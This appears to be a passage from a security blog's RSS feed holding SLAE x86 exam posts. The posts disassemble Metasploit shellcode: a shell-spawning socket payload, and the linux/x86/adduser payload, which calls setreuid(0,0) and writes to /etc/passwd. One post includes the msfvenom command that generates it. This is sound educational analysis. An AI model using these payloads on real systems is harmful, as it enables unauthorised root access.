&lt;span class=&quot;err&quot;&gt;00000017&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;682&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F62696E&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6e69622f&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; copy the pointer to &quot;/bin//sh&quot; into EBX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;E3&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; argv argument of execve (array of pointers)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; ECX is an array of pointers: first value is pointer to &quot;/bin//sh&quot;, second one is 0x00000000&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000020&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E1&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; ; syscall 0xb (11): execve&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000022&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;After input/output/error is redirected, the shellcode spawn a shell (&lt;code&gt;/bin//sh&lt;/code&gt;)
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;00000024&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6563686&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;          &lt;span class=&quot;nv&quot;&gt;arpl&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;gs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bp&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000028&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;205135&lt;/span&gt;            &lt;span class=&quot;nf&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dl&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;32617&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;A&lt;/span&gt;            &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ah&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;56&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000030&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;D&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebp&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000031&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;49&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000032&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;7847&lt;/span&gt;              &lt;span class=&quot;nf&quot;&gt;js&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7b&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000034&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0a&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;These last &lt;code&gt;9&lt;/code&gt; lines aren't Assembly instructions, but a string that's executed by &lt;code&gt;execve&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'6563686F20513532617A46564D4978470A'&lt;/span&gt; | xxd &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Output: &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 'echo Q52azFVMIxG'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It seems that, after a shell is spawned, it executes the command &lt;code&gt;echo Q52azFVMIxG&lt;/code&gt;, whose output is sent to the server socket. This may act as a password to connect to the server.&lt;/p&gt;
</description>
        <pubDate>Sat, 25 Dec 2021 00:00:00 +0100</pubDate>
        <link>/21/12/25/slae32-assignment-5_2</link>
        <guid isPermaLink="true">/21/12/25/slae32-assignment-5_2</guid>
        
        <category>slae</category>
        
        <category>assembly</category>
        
        <category>nasm</category>
        
        <category>c</category>
        
        <category>exam</category>
        
        <category>shellcode</category>
        
        <category>metasploit</category>
        
        <category>x86</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>SLAE x86 Exam - Assignment #5 Part 1</title>
        <description>&lt;h2 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.pentesteracademy.com/course?id=3&quot;&gt;https://www.pentesteracademy.com/course?id=3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Student ID: PA-30398&lt;/p&gt;
&lt;h2 id=&quot;foreword&quot;&gt;Foreword&lt;/h2&gt;
&lt;p&gt;The 5th assignment requires you to analyze at least 3 shellcode samples created using Msfpayload (nowadays &lt;code&gt;msfvenom&lt;/code&gt;) for 32-bit Linux systems.&lt;/p&gt;
&lt;p&gt;Programs like &lt;code&gt;gdb&lt;/code&gt;/&lt;code&gt;ndisasm&lt;/code&gt;/&lt;code&gt;libemu&lt;/code&gt; can be used for dissecting the shellcode and performing the analysis.&lt;/p&gt;
&lt;p&gt;I chose the following 4 shellcode samples:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;linux/x86/adduser&lt;/td&gt;
&lt;td&gt;Create a new user with UID 0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linux/x86/shell/reverse_nonx_tcp&lt;/td&gt;
&lt;td&gt;Spawn a command shell (staged). Connect back to the attacker&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linux/x86/shell_find_tag&lt;/td&gt;
&lt;td&gt;Spawn a shell on an established connection (proxy/nat safe)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linux/x86/shell_reverse_tcp_ipv6&lt;/td&gt;
&lt;td&gt;Connect back to attacker and spawn a command shell over IPv6&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;In this post I'll analyse &lt;code&gt;linux/x86/adduser&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;
&lt;h3 id=&quot;ndisasm&quot;&gt;NDISASM&lt;/h3&gt;
&lt;p&gt;To generate the payload:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x86/adduser &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shellcode.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;To analyse it with &lt;code&gt;ndisasm&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ndisasm shellcode2.bin &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 32 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; intel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It returns the following output (comments are mine though):&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; ECX = 0&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000000&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C9&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; EBX = 0&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000002&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CB&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; EAX = 70&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000004&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A46&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x46&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000006&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;58&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call setreuid&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000007&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;The shellcode runs the command &lt;code&gt;setreuid(0, 0)&lt;/code&gt; in order to execute subsequent instructions as &lt;strong&gt;root&lt;/strong&gt;
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; EAX = 5&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000009&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A05&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x5&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;58&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; pushes 0x2f6574632f2f70617373776400000000 to the stack&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; which is equal to &quot;/etc//passwd&quot;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;C9&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;51&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;6873737764&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64777373&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000014&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;682&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F2F7061&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x61702f2f&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000019&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;682&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F657463&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6374652f&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; store reference to string into EBX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;E3&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; ECX = 0x401 (1025)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000020&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;41&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000021&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;B504&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; syscall open&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000023&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;The shellcode calls &lt;code&gt;open()&lt;/code&gt; on &lt;code&gt;/etc//passwd&lt;/code&gt; with flags &lt;code&gt;O_WRONLY&lt;/code&gt; and &lt;code&gt;O_NOCTTY&lt;/code&gt;
&lt;/sub&gt;&lt;/p&gt;
&lt;p&gt;The file must already exist, otherwise the function won't be able to open it.&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; exchanges the values of EAX and EBX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000025&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;93&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;xchg&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; jumps to 0x00000053&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000026&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;E828000000&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x53&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;After exchanging EAX with EBX, the shellcode jumps to &lt;code&gt;0x00000053&lt;/code&gt;
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;D&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;insd&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;657461&lt;/span&gt;            &lt;span class=&quot;nb&quot;&gt;gs&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;jz&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x90&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;7370&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;jnc&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa1&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000031&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;insb&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000032&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;outsd&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000033&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;69743&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A417A2F6449&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;imul&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x49642f7a&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000003&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;736&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;A&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;jnc&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa7&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000003&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;D&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;3470&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000003&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;3449&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x49&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000041&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;52&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000042&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;633&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;arpl&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;di&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000044&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;303&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bh&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000046&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;303&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bh&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000048&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A2F&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000004&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;A2F&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000004&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;62696&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;E&lt;/span&gt;            &lt;span class=&quot;nv&quot;&gt;bound&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
